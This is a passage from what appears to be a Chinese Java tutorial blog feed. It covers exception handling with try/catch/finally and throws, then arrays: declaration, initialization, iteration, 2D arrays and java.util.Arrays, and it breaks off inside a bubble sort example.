API</strong>中已经定义了很多异常类，这些异常类分为两大类<strong>错误<code>Error</code><strong>和</strong>异常<code>Exception</code></strong></p><ul><li><strong><code>Exception</code>分支中有一个重要的子类<code>RuntimeException</code>(运行时异常)</strong></li></ul><table><thead><tr><th>异常：</th><th>解释：</th></tr></thead><tbody><tr><td><strong>ArrayIndexOutOfBoundsException</strong></td><td><strong>数组下标越界</strong></td></tr><tr><td><strong>NullPointerException</strong></td><td><strong>空指针异常</strong></td></tr><tr><td><strong>ArithmeticException</strong></td><td><strong>算数异常</strong></td></tr><tr><td><strong>MissingresourceException</strong></td><td><strong>丢失资源</strong></td></tr><tr><td><strong>ClassNotFoundException</strong></td><td><strong>找不到类</strong></td></tr></tbody></table><p>这些异常时不检查异常，程序中可以选择捕获处理，也可以不处理。</p><table><thead><tr><th>Error</th><th>Exception</th></tr></thead><tbody><tr><td>通常为灾难性的致命错误，程序无法控制和处理，当出现这些异常时，**<code>Java</code>虚拟机(JVM)**一般会终止线程；</td><td>通常情况下可以被程序处理，并在程序中应该尽可能的被处理的异常</td></tr></tbody></table><h3 id="（2）异常处理机制"><a href="#（2）异常处理机制" class="headerlink" title="（2）异常处理机制"></a>（2）异常处理机制</h3><ul><li>异常处理五个关键字</li><li><strong><code>try catch finally throw throws</code></strong></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">//监控区域</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ArithmeticException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//捕获异常</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"程序出现异常，变量b不能为0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">finally</span> <span class="token punctuation">&#123;</span><span class="token comment">//处理善后工作（无论异常是否出现，都会执行）</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"finally"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>要捕获多个异常，<strong>从小到大</strong>去捕获</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token comment">//监控区域</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Error</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//捕获异常</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> f<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> g<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Throwable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>主动抛出异常</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//假设方法中处理不了这个异常。方法上抛出异常</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">ArithmeticException</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ArithmeticException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//主动抛出异常，一般在方法中使用</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>经验：<ul><li>处理运行时异常时，采用逻辑去合理规避同时辅助<code>try-catch</code>处理</li><li>多重<code>catch</code>块后面，可以加一个<code>catch（Exception）</code>来处理可能会被遗漏的异常</li><li>不确定的代码也可加<code>try-catch</code>，处理潜在异常</li></ul></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.bilibili.com/video/BV12J41137hu">https://www.bilibili.com/video/BV12J41137hu</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java数组(Part-4)</title>
      <link href="/2022/03/03/java-shu-zu/"/>
      <url>/2022/03/03/java-shu-zu/</url>
      
        <content type="html"><![CDATA[<h1 id="Java数组"><a href="#Java数组" class="headerlink" title="Java数组"></a>Java数组</h1><h2 id="1、什么是数组"><a href="#1、什么是数组" class="headerlink" title="1、什么是数组"></a>1、什么是数组</h2><ul><li>相同类型数据的<strong>有序集合</strong></li><li><strong>相同类型</strong>的若干数据，按照一定先后次序排列组合而成</li><li>每一个数据称做一个<strong>数组元素</strong>，每个数组元素可通过一个<strong>下标访问</strong></li></ul><h2 id="2、数组声明和创建"><a href="#2、数组声明和创建" class="headerlink" title="2、数组声明和创建"></a>2、数组声明和创建</h2><ul><li>声明一个数组：首先<strong>声明</strong>数组变量，才能在程序中使用数组</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">;</span><span class="token comment">//数组声明首选方法</span><span class="token keyword">int</span> nums<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//效果相同</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>创建一个数组：Java语言使用new操作符创建数组</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java">nums <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//开辟空间，这里可以存放10个int类型的数字；</span><span class="token comment">//--------------------------------------------------------</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//声明并创建数组</span><span class="token comment">//--------------------------------------------------------</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>给数组元素赋值</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java">nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">//若不赋值，输出默认值；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>获取数组长度：<strong>arrays.length</strong></li></ul><h2 id="3、Java内存分析（了解）"><a href="#3、Java内存分析（了解）" class="headerlink" title="3、Java内存分析（了解）"></a>3、Java内存分析（了解）</h2><p><strong>堆</strong></p><ul><li>存放**<code>new</code><strong>的</strong>对象<strong>和</strong>数组**</li><li>可以被所有线程共享，不会存放别的对象引用</li></ul><p><strong>栈</strong></p><ul><li>存放基本变量类型（会包含这个基本类型的具体数值）</li><li>引用对象的变量（会存放这个引用在堆里面的具体地址）</li></ul><p><strong>方法区</strong></p><ul><li>可以被所有线程共享</li><li>包含了所有的<code>class</code>和<code>static</code>变量</li></ul><h2 id="4、三种初始化"><a href="#4、三种初始化" class="headerlink" title="4、三种初始化"></a>4、三种初始化</h2><ul><li>静态初始化</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>动态初始化（包含默认初始化）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//声明并创建</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">//赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>数组的默认初始化</p><p>数组是<strong>引用类型</strong>，他的元素相当于<strong>类</strong>的<strong>实例变量</strong>，因此，数组一经<strong>分配空间</strong>，其中的每个元素也被按照实例变量同样的方式被<strong>隐式初始化</strong>。</p></li></ul><h2 id="5、数组的基本特点"><a href="#5、数组的基本特点" class="headerlink" title="5、数组的基本特点"></a>5、数组的基本特点</h2><ul><li>其<strong>长度确定</strong>，一旦创建大小不可改变。</li><li><strong>类型必须相同</strong>，不允许出现混合类型。</li><li>数组中元素可以是<strong>任何数据类型</strong>，包括<strong>基本类型</strong>和<strong>引用类型</strong>。</li><li>数组<strong>变量属引用类型</strong>，数组可看成对象，数组中<strong>每个元素相当于该对象成员变量</strong>。</li><li>数组本身是对象，Java中对象在堆中，因此数组无论保存原始类型还是其他对象类型，<strong>数组对象本身是在堆中的。</strong></li><li>数组下标合法区间：**[0-length-1]**。</li></ul><h2 id="6、数组的使用"><a href="#6、数组的使用" class="headerlink" title="6、数组的使用"></a>6、数组的使用</h2><h3 id="普通For循环"><a href="#普通For循环" class="headerlink" title="普通For循环"></a>普通For循环</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayDemo01</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrays <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//打印全部数组元素</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrays<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arrays<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//计算所有数组元素和</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"---------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrays<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span>arrays<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//寻找数组中最大元素</span>        <span class="token keyword">int</span> max<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrays<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">&lt;</span> arrays<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                max <span class="token operator">=</span> arrays<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="For-Each循环"><a href="#For-Each循环" class="headerlink" title="For-Each循环"></a><strong>For-Each循环</strong></h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//遍历数组每个元素</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayDemo02</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrays <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> array <span class="token operator">:</span> arrays<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组作为方法参数"><a href="#数组作为方法参数" class="headerlink" title="数组作为方法参数"></a><strong>数组作为方法参数</strong></h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//打印数组元素 </span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrays<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrays<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arrays<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组作返回值"><a href="#数组作返回值" class="headerlink" title="数组作返回值"></a><strong>数组作返回值</strong></h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//反转数组(数组作返回值)</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrays<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arrays<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>j <span class="token operator">=</span> result<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrays<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">,</span>j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        result<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>arrays<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、二维数组"><a href="#7、二维数组" class="headerlink" title="7、二维数组"></a>7、二维数组</h2><ul><li><p>多维数组可以看成是数组的数组，如二维数组就是一个特殊的一维数组，其每个元素都是一个一维数组。</p></li><li><p>二维数组</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//可看成两行五列数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//打印二维数组元素</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayDemo03</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*结果：1 2 2 3 3 4 4 5 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8、Arrays类"><a href="#8、Arrays类" class="headerlink" title="8、Arrays类"></a>8、Arrays类</h2><ul><li>数组<strong>工具类</strong><code>java.util.Arrays</code></li><li><strong>Arrays类</strong>中方法都是<code>static</code>修饰的<strong>静态方法</strong>，使用时<strong>可以</strong>直接使用<strong>类名进行调用</strong>；</li><li>具体常用功能：<ul><li>给数组<strong>赋值</strong>：通过<code>fill</code>方法。</li><li>对数组<strong>排序</strong>：通过<code>sort</code>方法，按<strong>升序</strong>。</li><li><strong>比较</strong>数组：通过<code>equals</code>方法比较数组中元素值<strong>是否相等</strong>。</li><li><strong>查找</strong>数组元素：<code>binarySearch</code> 方法能对排序好的数组进行<strong>二分查找</strong>操作</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayDemo4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20964</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">543</span><span class="token punctuation">,</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">885</span><span class="token punctuation">,</span><span class="token number">56432</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//数组进行排序：升序</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//打印数组元素</span>        <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2-4填充1</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//打印数组元素</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="9、冒泡排序"><a href="#9、冒泡排序" class="headerlink" title="9、冒泡排序"></a>9、冒泡排序</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayDemo05</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2387</span><span class="token punctuation">,</span><span class="token number">232</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token 